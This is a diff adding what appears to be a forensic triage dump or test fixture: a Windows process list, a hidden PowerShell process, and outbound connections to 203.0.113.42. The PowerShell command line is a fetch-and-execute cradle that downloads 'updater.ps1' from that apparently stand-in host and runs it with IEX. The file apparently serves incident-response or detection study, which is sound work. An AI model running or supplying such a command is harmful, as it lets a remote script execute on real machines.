@@ -1,0 +1,16 @@
+=========== SYSTEM PROCESS LIST ==========
+PROCESS_NAME: System PID: 4
+PROCESS_NAME: smss.exe PID: 252
+PROCESS_NAME: csrss.exe PID: 344
+PROCESS_NAME: wininit.exe PID: 412
+PROCESS_NAME: services.exe PID: 524
+PROCESS_NAME: lsass.exe PID: 532
+PROCESS_NAME: svchost.exe PID: 892
+PROCESS_NAME: explorer.exe PID: 1220
+PROCESS_NAME: powershell.exe PID: 3452
+COMMAND_LINE: "powershell.exe" -NonI -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.42/updater.ps1')"
+CREATION_TIME: 2023-11-16 09:02:15
+
+=========== NETWORK CONNECTIONS ==========
+192.168.1.10:49242 > 203.0.113.42:443
+192.168.1.10:49244 > 203.0.113.42:80
